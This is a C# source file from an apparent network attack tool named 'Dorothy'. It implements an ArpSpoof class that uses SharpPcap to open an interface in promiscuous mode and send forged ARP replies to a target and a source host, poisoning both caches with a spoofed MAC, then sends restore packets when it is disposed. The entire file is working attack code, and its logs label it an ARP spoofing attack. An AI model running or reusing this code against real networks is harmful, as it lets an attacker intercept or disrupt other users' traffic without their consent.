using System;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using NLog;
using PacketDotNet;
using SharpPcap;
using SharpPcap.LibPcap;
using System.Net;
using System.Linq;

namespace Dorothy.Models
{
    public class ArpSpoof : IDisposable
    {
        private readonly string _sourceIp;
        private readonly PhysicalAddress _sourceMac;
        private readonly string _targetIp;
        private readonly PhysicalAddress _targetMac;
        private readonly PhysicalAddress _spoofedMac;
        private LibPcapLiveDevice? _device;
        private static readonly ILogger Logger = LogManager.GetCurrentClassLogger();
        private volatile bool _isDisposed;

        public ArpSpoof(string sourceIp, byte[] sourceMac, string targetIp, byte[] targetMac, byte[] spoofedMac, CancellationToken cancellationToken)
        {
            _sourceIp = sourceIp;
            _sourceMac = new PhysicalAddress(sourceMac);
            _targetIp = targetIp;
            _targetMac = new PhysicalAddress(targetMac);
            _spoofedMac = new PhysicalAddress(spoofedMac);
        }

        public async Task StartAsync()
        {
            if (_isDisposed)
            {
                throw new ObjectDisposedException(nameof(ArpSpoof));
            }

            await Task.Run(() =>
            {
                Logger.Info($"Starting ARP Spoofing attack. Source IP: {_sourceIp}, Target IP: {_targetIp}");
                Logger.Info($"Source MAC: {_sourceMac}, Target MAC: {_targetMac}, Spoofed MAC: {_spoofedMac}");
                
                try
                {
                    // List available devices for debugging
                    var allDevices = CaptureDeviceList.Instance.OfType<LibPcapLiveDevice>().ToList();
                    Logger.Info($"Available network interfaces: {allDevices.Count}");
                    
                    // Find the correct network interface based on the source IP
                    var device = allDevices.FirstOrDefault(d => d.Interface.Addresses
                        .Any(a => a.Addr?.ipAddress?.ToString() == _sourceIp));

                    if (device == null)
                    {
                        throw new Exception($"No suitable network interface found for source IP: {_sourceIp}");
                    }

                    Logger.Info($"Selected interface: {device.Interface.FriendlyName}");

                    _device = device;
                    _device.Open(DeviceModes.Promiscuous | DeviceModes.DataTransferUdp | DeviceModes.NoCaptureLocal);
                    Logger.Info("Device opened successfully");

                    // Send single ARP packet to target
                    SendArpPacket(_sourceIp, _spoofedMac, _targetIp, _targetMac);
                    Logger.Info($"Sent ARP packet: {_sourceIp} ({_spoofedMac}) -> {_targetIp} ({_targetMac})");

                    // Send single reverse ARP packet
                    SendArpPacket(_targetIp, _spoofedMac, _sourceIp, _sourceMac);
                    Logger.Info($"Sent reverse ARP packet: {_targetIp} ({_spoofedMac}) -> {_sourceIp} ({_sourceMac})");

                    Logger.Info($"ARP Spoofing attack completed successfully on interface: {_device.Interface.FriendlyName}");
                }
                catch (Exception ex)
                {
                    Logger.Error(ex, "Failed to start ARP Spoofing attack");
                    throw;
                }
            });
        }

        private void SendArpPacket(string senderIp, PhysicalAddress senderMac, string targetIp, PhysicalAddress targetMac)
        {
            try
            {
                if (_device == null || !_device.Opened)
                {
                    throw new InvalidOperationException("Device is not opened");
                }

                var arpPacket = new ArpPacket(
                    ArpOperation.Response,
                    targetMac,
                    IPAddress.Parse(targetIp),
                    senderMac,
                    IPAddress.Parse(senderIp));

                var ethernetPacket = new EthernetPacket(
                    senderMac,
                    targetMac,
                    EthernetType.Arp)
                {
                    PayloadPacket = arpPacket
                };

                Logger.Debug($"Sending packet: {ethernetPacket}");
                _device.SendPacket(ethernetPacket);
            }
            catch (Exception ex)
            {
                Logger.Error($"Failed to send ARP packet. Error: {ex.Message}");
                throw;
            }
        }

        public void Dispose()
        {
            if (_isDisposed)
            {
                return;
            }

            try
            {
                _isDisposed = true;
                Logger.Info("Disposing ARP Spoofer...");
                
                if (_device != null && _device.Opened)
                {
                    Logger.Info("Sending restore packets...");
                    try
                    {
                        // Restore original ARP entries
                        SendArpPacket(_sourceIp, _sourceMac, _targetIp, _targetMac);
                        SendArpPacket(_targetIp, _targetMac, _sourceIp, _sourceMac);
                        Logger.Info("Sent restore ARP packets with original MAC addresses");
                    }
                    catch (Exception ex)
                    {
                        Logger.Error(ex, "Failed to send restore packets");
                    }
                }
                
                if (_device != null)
                {
                    if (_device.Opened)
                    {
                        _device.Close();
                    }
                    _device.Dispose();
                    Logger.Info("Device closed and disposed");
                }
            }
            catch (Exception ex)
            {
                Logger.Error(ex, "Error during disposal");
            }
        }
    }
} 